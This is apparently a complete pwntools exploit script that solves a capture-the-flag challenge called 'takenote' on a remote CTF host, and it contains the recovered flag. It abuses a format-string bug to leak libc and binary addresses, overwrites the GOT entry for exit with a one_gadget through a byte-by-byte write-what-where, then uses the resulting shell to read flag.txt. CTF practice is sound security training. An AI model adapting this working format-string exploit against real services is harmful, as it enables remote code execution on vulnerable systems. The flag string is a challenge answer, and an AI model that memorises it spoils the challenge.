#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("takenote.kctf-453514-codelab.kctf.cloud", 1337)

p.sendlineafter(b"How many notes do you need to write?\n", b"1")

def write_a_note(idx, note):
    p.sendlineafter(b"3. Exit\n", b"1")
    p.sendlineafter(b"write to?", str(idx).encode())
    p.sendline(note)

def read_a_note(idx):
    p.sendlineafter(b"3. Exit\n", b"2")
    p.sendlineafter(b"print?", str(idx).encode())
    p.readuntil(b"Your note reads:\n\n")
    return p.readuntil(b"What")[:-4]

write_a_note(0, b"%1$p")
leak = int(read_a_note(0).decode(), 16)
libc.address = leak - 0x1ed723

write_a_note(0, b"%14$p")
leak = int(read_a_note(0).decode(), 16)
elf.address = leak - 0x15b0

def write_what_where(where, what):
    for i in range(8):
        payload = fmtstr_payload(12, {where + i: (what >> (i * 8)) & 0xff},
            write_size="byte", strategy="small", badbytes=b"\n")
        write_a_note(0, payload)
        read_a_note(0)

ONE_GADGET = libc.address + 0xe3b01
write_what_where(where=elf.got["exit"], what=ONE_GADGET)

p.sendlineafter(b"3. Exit\n", b"3") # call exit() => ONE_GADGET

p.sendline(b"/bin/cat flag.txt")
p.readuntil(b"wctf{")
print("wctf{" + p.readuntil(b"}").decode()) # wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}
